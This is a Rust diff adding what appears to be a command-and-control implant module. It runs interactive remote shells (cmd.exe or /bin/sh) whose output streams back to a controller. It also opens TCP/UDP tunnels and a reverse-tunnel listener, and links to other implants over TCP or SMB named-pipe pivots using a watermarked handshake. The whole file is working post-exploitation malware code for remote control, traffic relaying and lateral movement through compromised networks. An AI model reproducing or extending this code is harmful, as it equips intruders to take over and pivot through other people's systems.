@@ -1,0 +1,626 @@
+#![allow(dead_code)]
+
+use std::collections::HashMap;
+use std::fs::{File, OpenOptions};
+use std::io::{self, ErrorKind, Read, Write};
+use std::net::{Shutdown, TcpListener, TcpStream, UdpSocket};
+use std::path::PathBuf;
+use std::sync::atomic::{AtomicBool, AtomicU32, Ordering};
+use std::sync::{Arc, Mutex, OnceLock};
+use std::time::Duration;
+#[cfg(windows)]
+use std::os::windows::fs::OpenOptionsExt;
+
+use crate::async_queue::queue_binary_response;
+use crate::protocol::{self, WriterBE};
+use crate::runtime_fs;
+
+pub const PIVOT_TYPE_SMB: u8 = 1;
+pub const PIVOT_TYPE_TCP: u8 = 2;
+pub const PIVOT_TYPE_DISCONNECT: u8 = 10;
+pub const REVERSE_TUNNEL_TYPE: u32 = 5;
+
+struct ShellSession {
+    job_id: u32,
+    child: Mutex<std::process::Child>,
+    stdin: Mutex<Option<std::process::ChildStdin>>,
+    closed: AtomicBool,
+}
+
+enum TunnelIo {
+    Tcp(TcpStream),
+    Udp(UdpSocket),
+}
+
+struct TunnelSession {
+    id: u32,
+    tunnel_type: u32,
+    paused: AtomicBool,
+    closed: AtomicBool,
+    io: Mutex<Option<TunnelIo>>,
+    listener: Mutex<Option<TcpListener>>,
+}
+
+enum PivotIo {
+    Tcp(TcpStream),
+    Pipe(File),
+}
+
+struct PivotSession {
+    id: u32,
+    kind: u8,
+    closed: AtomicBool,
+    io: Mutex<Option<PivotIo>>,
+}
+
+fn shell_sessions() -> &'static Mutex<HashMap<u32, Arc<ShellSession>>> {
+    static SESSIONS: OnceLock<Mutex<HashMap<u32, Arc<ShellSession>>>> = OnceLock::new();
+    SESSIONS.get_or_init(|| Mutex::new(HashMap::new()))
+}
+
+fn tunnel_sessions() -> &'static Mutex<HashMap<u32, Arc<TunnelSession>>> {
+    static SESSIONS: OnceLock<Mutex<HashMap<u32, Arc<TunnelSession>>>> = OnceLock::new();
+    SESSIONS.get_or_init(|| Mutex::new(HashMap::new()))
+}
+
+fn pivot_sessions() -> &'static Mutex<HashMap<u32, Arc<PivotSession>>> {
+    static SESSIONS: OnceLock<Mutex<HashMap<u32, Arc<PivotSession>>>> = OnceLock::new();
+    SESSIONS.get_or_init(|| Mutex::new(HashMap::new()))
+}
+
+fn next_tunnel_id() -> u32 {
+    static NEXT_ID: AtomicU32 = AtomicU32::new(0x7000_0000);
+    NEXT_ID.fetch_add(1, Ordering::Relaxed)
+}
+
+pub fn shell_job_entries() -> Vec<(u32, u32, u32)> {
+    shell_sessions()
+        .lock()
+        .map(|map| {
+            map.keys()
+                .copied()
+                .map(|job_id| (job_id, protocol::JOB_TYPE_SHELL, protocol::JOB_STATE_RUNNING))
+                .collect()
+        })
+        .unwrap_or_default()
+}
+
+pub fn start_shell_session(shell_id: u32, program_args: &str) -> io::Result<()> {
+    let args = split_args(program_args);
+    let mut command = if args.is_empty() {
+        if cfg!(windows) {
+            std::process::Command::new("cmd.exe")
+        } else {
+            std::process::Command::new("/bin/sh")
+        }
+    } else {
+        let mut cmd = std::process::Command::new(&args[0]);
+        cmd.args(args.iter().skip(1));
+        cmd
+    };
+
+    command.stdin(std::process::Stdio::piped());
+    command.stdout(std::process::Stdio::piped());
+    command.stderr(std::process::Stdio::piped());
+
+    let mut child = command.spawn()?;
+    let stdin = child.stdin.take();
+    let stdout = child.stdout.take();
+
+    let Some(stdout) = stdout else {
+        return Err(io::Error::new(ErrorKind::BrokenPipe, "shell stdout unavailable"));
+    };
+
+    let session = Arc::new(ShellSession {
+        job_id: shell_id,
+        child: Mutex::new(child),
+        stdin: Mutex::new(stdin),
+        closed: AtomicBool::new(false),
+    });
+
+    if let Ok(mut map) = shell_sessions().lock() {
+        map.insert(shell_id, session.clone());
+    }
+
+    std::thread::spawn(move || shell_read_loop(session, stdout));
+    Ok(())
+}
+
+fn shell_read_loop(session: Arc<ShellSession>, mut stdout: std::process::ChildStdout) {
+    let mut buf = [0u8; 4096];
+    loop {
+        match stdout.read(&mut buf) {
+            Ok(0) => break,
+            Ok(n) => {
+                let mut payload = WriterBE::new();
+                payload.write_u8(protocol::JOB_TYPE_SHELL as u8);
+                payload.write_u8(protocol::JOB_STATE_RUNNING as u8);
+                payload.write_string(&String::from_utf8_lossy(&buf[..n]));
+                queue_binary_response(session.job_id, protocol::COMMAND_JOB, &payload.into_bytes());
+            }
+            Err(err) if err.kind() == ErrorKind::Interrupted => continue,
+            Err(_) => break,
+        }
+    }
+
+    if let Ok(mut child) = session.child.lock() {
+        let _ = child.wait();
+    }
+    if let Ok(mut map) = shell_sessions().lock() {
+        map.remove(&session.job_id);
+    }
+
+    let mut payload = WriterBE::new();
+    payload.write_u8(protocol::JOB_TYPE_SHELL as u8);
+    payload.write_u8(protocol::JOB_STATE_KILLED as u8);
+    queue_binary_response(session.job_id, protocol::COMMAND_JOB, &payload.into_bytes());
+}
+
+pub fn write_shell_input(shell_id: u32, data: &[u8]) -> io::Result<()> {
+    let session = shell_sessions()
+        .lock()
+        .ok()
+        .and_then(|map| map.get(&shell_id).cloned())
+        .ok_or_else(|| io::Error::new(ErrorKind::NotFound, "shell session not found"))?;
+
+    let mut guard = session
+        .stdin
+        .lock()
+        .map_err(|_| io::Error::new(ErrorKind::Other, "shell stdin lock poisoned"))?;
+    let stdin = guard
+        .as_mut()
+        .ok_or_else(|| io::Error::new(ErrorKind::BrokenPipe, "shell stdin closed"))?;
+    stdin.write_all(data)
+}
+
+pub fn close_shell_session(shell_id: u32) -> bool {
+    let session = shell_sessions()
+        .lock()
+        .ok()
+        .and_then(|map| map.get(&shell_id).cloned());
+
+    let Some(session) = session else {
+        return false;
+    };
+
+    if session.closed.swap(true, Ordering::SeqCst) {
+        return true;
+    }
+
+    if let Ok(mut stdin) = session.stdin.lock() {
+        let _ = stdin.take();
+    }
+    if let Ok(mut child) = session.child.lock() {
+        let _ = child.kill();
+    }
+    true
+}
+
+pub fn kill_shell_job(job_id: u32) -> bool {
+    close_shell_session(job_id)
+}
+
+pub fn start_tcp_tunnel(channel_id: u32, tunnel_type: u32, address: &str, port: u16) -> io::Result<Vec<u8>> {
+    let stream = TcpStream::connect((address, port))?;
+    let _ = stream.set_read_timeout(Some(Duration::from_millis(500)));
+    let read_stream = stream.try_clone()?;
+    let session = Arc::new(TunnelSession {
+        id: channel_id,
+        tunnel_type,
+        paused: AtomicBool::new(false),
+        closed: AtomicBool::new(false),
+        io: Mutex::new(Some(TunnelIo::Tcp(stream))),
+        listener: Mutex::new(None),
+    });
+    if let Ok(mut map) = tunnel_sessions().lock() {
+        map.insert(channel_id, session.clone());
+    }
+    std::thread::spawn(move || tunnel_read_loop_tcp(session, read_stream));
+    Ok(tunnel_status_payload(tunnel_type, 0))
+}
+
+pub fn start_udp_tunnel(channel_id: u32, address: &str, port: u16) -> io::Result<Vec<u8>> {
+    let socket = UdpSocket::bind("0.0.0.0:0")?;
+    socket.connect((address, port))?;
+    let _ = socket.set_read_timeout(Some(Duration::from_millis(500)));
+    let read_socket = socket.try_clone()?;
+    let session = Arc::new(TunnelSession {
+        id: channel_id,
+        tunnel_type: 2,
+        paused: AtomicBool::new(false),
+        closed: AtomicBool::new(false),
+        io: Mutex::new(Some(TunnelIo::Udp(socket))),
+        listener: Mutex::new(None),
+    });
+    if let Ok(mut map) = tunnel_sessions().lock() {
+        map.insert(channel_id, session.clone());
+    }
+    std::thread::spawn(move || tunnel_read_loop_udp(session, read_socket));
+    Ok(tunnel_status_payload(2, 0))
+}
+
+pub fn start_reverse_tunnel(tunnel_id: u32, port: u16) -> Vec<u8> {
+    let listener = match TcpListener::bind(("0.0.0.0", port)) {
+        Ok(listener) => listener,
+        Err(_) => return tunnel_status_payload(REVERSE_TUNNEL_TYPE, 1),
+    };
+    let accept_listener = match listener.try_clone() {
+        Ok(clone) => clone,
+        Err(_) => return tunnel_status_payload(REVERSE_TUNNEL_TYPE, 1),
+    };
+    let session = Arc::new(TunnelSession {
+        id: tunnel_id,
+        tunnel_type: REVERSE_TUNNEL_TYPE,
+        paused: AtomicBool::new(false),
+        closed: AtomicBool::new(false),
+        io: Mutex::new(None),
+        listener: Mutex::new(Some(listener)),
+    });
+    if let Ok(mut map) = tunnel_sessions().lock() {
+        map.insert(tunnel_id, session.clone());
+    }
+    std::thread::spawn(move || reverse_accept_loop(session.id, accept_listener));
+    tunnel_status_payload(REVERSE_TUNNEL_TYPE, 0)
+}
+
+fn reverse_accept_loop(parent_id: u32, listener: TcpListener) {
+    loop {
+        match listener.accept() {
+            Ok((stream, _)) => {
+                let _ = stream.set_read_timeout(Some(Duration::from_millis(500)));
+                let read_stream = match stream.try_clone() {
+                    Ok(clone) => clone,
+                    Err(_) => continue,
+                };
+                let channel_id = next_tunnel_id();
+                let child = Arc::new(TunnelSession {
+                    id: channel_id,
+                    tunnel_type: REVERSE_TUNNEL_TYPE,
+                    paused: AtomicBool::new(false),
+                    closed: AtomicBool::new(false),
+                    io: Mutex::new(Some(TunnelIo::Tcp(stream))),
+                    listener: Mutex::new(None),
+                });
+                if let Ok(mut map) = tunnel_sessions().lock() {
+                    map.insert(channel_id, child.clone());
+                }
+                let mut payload = WriterBE::new();
+                payload.write_u32(channel_id);
+                queue_binary_response(parent_id, protocol::COMMAND_TUNNEL_ACCEPT, &payload.into_bytes());
+                std::thread::spawn(move || tunnel_read_loop_tcp(child, read_stream));
+            }
+            Err(err) if err.kind() == ErrorKind::WouldBlock || err.kind() == ErrorKind::TimedOut => continue,
+            Err(_) => break,
+        }
+    }
+}
+
+fn tunnel_read_loop_tcp(session: Arc<TunnelSession>, mut stream: TcpStream) {
+    let mut buf = vec![0u8; 64 * 1024];
+    loop {
+        match stream.read(&mut buf) {
+            Ok(0) => break,
+            Ok(n) => {
+                if !session.paused.load(Ordering::Relaxed) {
+                    let mut payload = WriterBE::new();
+                    payload.write_bytes(&buf[..n]);
+                    queue_binary_response(session.id, protocol::COMMAND_TUNNEL_WRITE_TCP, &payload.into_bytes());
+                }
+            }
+            Err(err) if err.kind() == ErrorKind::WouldBlock || err.kind() == ErrorKind::TimedOut || err.kind() == ErrorKind::Interrupted => continue,
+            Err(_) => break,
+        }
+    }
+    let _ = close_tunnel_session(session.id);
+    queue_tunnel_close(session.id, session.tunnel_type, 1);
+}
+
+fn tunnel_read_loop_udp(session: Arc<TunnelSession>, socket: UdpSocket) {
+    let mut buf = vec![0u8; 64 * 1024];
+    loop {
+        match socket.recv(&mut buf) {
+            Ok(n) => {
+                if !session.paused.load(Ordering::Relaxed) {
+                    let mut payload = WriterBE::new();
+                    payload.write_bytes(&buf[..n]);
+                    queue_binary_response(session.id, protocol::COMMAND_TUNNEL_WRITE_TCP, &payload.into_bytes());
+                }
+            }
+            Err(err) if err.kind() == ErrorKind::WouldBlock || err.kind() == ErrorKind::TimedOut || err.kind() == ErrorKind::Interrupted => continue,
+            Err(_) => break,
+        }
+    }
+    let _ = close_tunnel_session(session.id);
+    queue_tunnel_close(session.id, session.tunnel_type, 1);
+}
+
+pub fn write_tunnel_data(channel_id: u32, data: &[u8]) -> io::Result<()> {
+    let session = tunnel_sessions()
+        .lock()
+        .ok()
+        .and_then(|map| map.get(&channel_id).cloned())
+        .ok_or_else(|| io::Error::new(ErrorKind::NotFound, "tunnel session not found"))?;
+
+    let mut io_guard = session
+        .io
+        .lock()
+        .map_err(|_| io::Error::new(ErrorKind::Other, "tunnel I/O lock poisoned"))?;
+    match io_guard.as_mut() {
+        Some(TunnelIo::Tcp(stream)) => stream.write_all(data),
+        Some(TunnelIo::Udp(socket)) => socket.send(data).map(|_| ()),
+        None => Err(io::Error::new(ErrorKind::NotConnected, "tunnel has no active transport")),
+    }
+}
+
+pub fn note_tunnel_write_failure(channel_id: u32, result: u32) {
+    queue_tunnel_close(channel_id, 0, result);
+}
+
+pub fn set_tunnel_paused(channel_id: u32, paused: bool) {
+    if let Some(session) = tunnel_sessions().lock().ok().and_then(|map| map.get(&channel_id).cloned()) {
+        session.paused.store(paused, Ordering::Relaxed);
+    }
+}
+
+pub fn close_tunnel_session(channel_id: u32) -> bool {
+    let session = tunnel_sessions().lock().ok().and_then(|mut map| map.remove(&channel_id));
+    let Some(session) = session else {
+        return false;
+    };
+    if session.closed.swap(true, Ordering::SeqCst) {
+        return true;
+    }
+
+    if let Ok(mut listener) = session.listener.lock() {
+        let _ = listener.take();
+    }
+    if let Ok(mut io_guard) = session.io.lock() {
+        match io_guard.take() {
+            Some(TunnelIo::Tcp(stream)) => {
+                let _ = stream.shutdown(Shutdown::Both);
+            }
+            Some(TunnelIo::Udp(_)) | None => {}
+        }
+    }
+    true
+}
+
+fn queue_tunnel_close(channel_id: u32, tunnel_type: u32, result: u32) {
+    let mut payload = WriterBE::new();
+    payload.write_u32(tunnel_type);
+    payload.write_u32(result);
+    queue_binary_response(channel_id, protocol::COMMAND_TUNNEL_CLOSE, &payload.into_bytes());
+}
+
+fn tunnel_status_payload(tunnel_type: u32, result: u32) -> Vec<u8> {
+    let mut payload = WriterBE::new();
+    payload.write_u32(tunnel_type);
+    payload.write_u32(result);
+    payload.into_bytes()
+}
+
+pub fn start_pivot_tcp(task_id: u32, address: &str, port: u16) -> io::Result<Vec<u8>> {
+    let mut stream = TcpStream::connect((address, port))?;
+    let _ = stream.set_read_timeout(Some(Duration::from_secs(5)));
+    let payload = read_pivot_handshake_tcp(&mut stream)?;
+    let _ = stream.set_read_timeout(None);
+    let read_stream = stream.try_clone()?;
+    let session = Arc::new(PivotSession {
+        id: task_id,
+        kind: PIVOT_TYPE_TCP,
+        closed: AtomicBool::new(false),
+        io: Mutex::new(Some(PivotIo::Tcp(stream))),
+    });
+    if let Ok(mut map) = pivot_sessions().lock() {
+        map.insert(task_id, session.clone());
+    }
+    std::thread::spawn(move || pivot_read_loop_tcp(task_id, read_stream));
+    Ok(payload)
+}
+
+pub fn start_pivot_smb(task_id: u32, pipe_name: &str) -> io::Result<Vec<u8>> {
+    let path = normalize_pipe_path(pipe_name);
+    let mut options = OpenOptions::new();
+    options.read(true).write(true);
+    #[cfg(windows)]
+    {
+        options.share_mode(0x00000001 | 0x00000002);
+    }
+    let mut pipe = options.open(path)?;
+    let payload = read_pivot_handshake_pipe(&mut pipe)?;
+    let read_pipe = pipe.try_clone()?;
+    let session = Arc::new(PivotSession {
+        id: task_id,
+        kind: PIVOT_TYPE_SMB,
+        closed: AtomicBool::new(false),
+        io: Mutex::new(Some(PivotIo::Pipe(pipe))),
+    });
+    if let Ok(mut map) = pivot_sessions().lock() {
+        map.insert(task_id, session.clone());
+    }
+    std::thread::spawn(move || pivot_read_loop_pipe(task_id, read_pipe));
+    Ok(payload)
+}
+
+fn normalize_pipe_path(pipe_name: &str) -> PathBuf {
+    let path = runtime_fs::normalize_path(pipe_name);
+    if path.is_absolute() {
+        path
+    } else {
+        PathBuf::from(pipe_name)
+    }
+}
+
+fn read_pivot_handshake_tcp(stream: &mut TcpStream) -> io::Result<Vec<u8>> {
+    let mut hdr = [0u8; 4];
+    stream.read_exact(&mut hdr)?;
+    let size = u32::from_le_bytes(hdr) as usize;
+    if size == 0 || size > 4 * 1024 * 1024 {
+        return Err(io::Error::new(ErrorKind::InvalidData, "invalid pivot frame size"));
+    }
+    let mut payload = vec![0u8; size];
+    stream.read_exact(&mut payload)?;
+    encode_pivot_handshake(PIVOT_TYPE_TCP, &payload)
+}
+
+fn read_pivot_handshake_pipe(pipe: &mut File) -> io::Result<Vec<u8>> {
+    let mut buf = vec![0u8; 8192];
+    let size = pipe.read(&mut buf)?;
+    buf.truncate(size);
+    if buf.len() >= 8 {
+        let declared = u32::from_le_bytes([buf[0], buf[1], buf[2], buf[3]]) as usize;
+        if declared > 0 && declared == buf.len().saturating_sub(4) {
+            buf.drain(..4);
+        }
+    }
+    encode_pivot_handshake(PIVOT_TYPE_SMB, &buf)
+}
+
+fn encode_pivot_handshake(kind: u8, payload: &[u8]) -> io::Result<Vec<u8>> {
+    if payload.len() < 4 {
+        return Err(io::Error::new(ErrorKind::UnexpectedEof, "pivot handshake too short"));
+    }
+    let watermark = u32::from_le_bytes([payload[0], payload[1], payload[2], payload[3]]);
+    let mut out = WriterBE::new();
+    out.write_u8(kind);
+    out.write_u32(watermark);
+    out.write_bytes(&payload[4..]);
+    Ok(out.into_bytes())
+}
+
+fn pivot_read_loop_tcp(pivot_id: u32, mut stream: TcpStream) {
+    loop {
+        match read_pivot_frame_tcp(&mut stream) {
+            Ok(Some(payload)) => queue_pivot_data(pivot_id, &payload),
+            Ok(None) => break,
+            Err(_) => break,
+        }
+    }
+    close_pivot_session_async(pivot_id);
+}
+
+fn read_pivot_frame_tcp(stream: &mut TcpStream) -> io::Result<Option<Vec<u8>>> {
+    let mut hdr = [0u8; 4];
+    match stream.read_exact(&mut hdr) {
+        Ok(()) => {}
+        Err(err) if err.kind() == ErrorKind::UnexpectedEof || err.kind() == ErrorKind::ConnectionReset => return Ok(None),
+        Err(err) => return Err(err),
+    }
+    let size = u32::from_le_bytes(hdr) as usize;
+    if size == 0 || size > 4 * 1024 * 1024 {
+        return Ok(None);
+    }
+    let mut payload = vec![0u8; size];
+    stream.read_exact(&mut payload)?;
+    Ok(Some(payload))
+}
+
+fn pivot_read_loop_pipe(pivot_id: u32, mut pipe: File) {
+    let mut buf = vec![0u8; 8192];
+    loop {
+        match pipe.read(&mut buf) {
+            Ok(0) => break,
+            Ok(n) => queue_pivot_data(pivot_id, &buf[..n]),
+            Err(_) => break,
+        }
+    }
+    close_pivot_session_async(pivot_id);
+}
+
+fn queue_pivot_data(pivot_id: u32, data: &[u8]) {
+    let mut payload = WriterBE::new();
+    payload.write_u32(pivot_id);
+    payload.write_bytes(data);
+    queue_binary_response(0, protocol::COMMAND_PIVOT_EXEC, &payload.into_bytes());
+}
+
+pub fn write_pivot_data(pivot_id: u32, data: &[u8]) -> io::Result<()> {
+    let session = pivot_sessions()
+        .lock()
+        .ok()
+        .and_then(|map| map.get(&pivot_id).cloned())
+        .ok_or_else(|| io::Error::new(ErrorKind::NotFound, "pivot session not found"))?;
+
+    let mut io_guard = session
+        .io
+        .lock()
+        .map_err(|_| io::Error::new(ErrorKind::Other, "pivot I/O lock poisoned"))?;
+    match io_guard.as_mut() {
+        Some(PivotIo::Tcp(stream)) => {
+            stream.write_all(&(data.len() as u32).to_le_bytes())?;
+            stream.write_all(data)
+        }
+        Some(PivotIo::Pipe(pipe)) => pipe.write_all(data),
+        None => Err(io::Error::new(ErrorKind::NotConnected, "pivot transport already closed")),
+    }
+}
+
+pub fn close_pivot_session(pivot_id: u32) -> u8 {
+    match remove_pivot_session(pivot_id) {
+        Some(session) => close_pivot(session, false),
+        None => 0,
+    }
+}
+
+fn close_pivot_session_async(pivot_id: u32) {
+    let Some(session) = remove_pivot_session(pivot_id) else {
+        return;
+    };
+    let pivot_type = close_pivot(session, true);
+    let mut payload = WriterBE::new();
+    payload.write_u32(pivot_id);
+    payload.write_u8(pivot_type);
+    queue_binary_response(0, protocol::COMMAND_UNLINK, &payload.into_bytes());
+}
+
+fn remove_pivot_session(pivot_id: u32) -> Option<Arc<PivotSession>> {
+    pivot_sessions().lock().ok().and_then(|mut map| map.remove(&pivot_id))
+}
+
+fn close_pivot(session: Arc<PivotSession>, disconnected: bool) -> u8 {
+    if session.closed.swap(true, Ordering::SeqCst) {
+        return if disconnected { PIVOT_TYPE_DISCONNECT } else { session.kind };
+    }
+    if let Ok(mut io_guard) = session.io.lock() {
+        match io_guard.take() {
+            Some(PivotIo::Tcp(stream)) => {
+                let _ = stream.shutdown(Shutdown::Both);
+            }
+            Some(PivotIo::Pipe(_)) | None => {}
+        }
+    }
+    if disconnected {
+        PIVOT_TYPE_DISCONNECT
+    } else {
+        session.kind
+    }
+}
+
+fn split_args(line: &str) -> Vec<String> {
+    let mut args = Vec::new();
+    let mut current = String::new();
+    let mut in_quotes = false;
+    let mut escape = false;
+
+    for ch in line.chars() {
+        if escape {
+            current.push(ch);
+            escape = false;
+            continue;
+        }
+        match ch {
+            '\\' => escape = true,
+            '"' => in_quotes = !in_quotes,
+            c if c.is_whitespace() && !in_quotes => {
+                if !current.is_empty() {
+                    args.push(std::mem::take(&mut current));
+                }
+            }
+            _ => current.push(ch),
+        }
+    }
+    if !current.is_empty() {
+        args.push(current);
+    }
+    args
+}
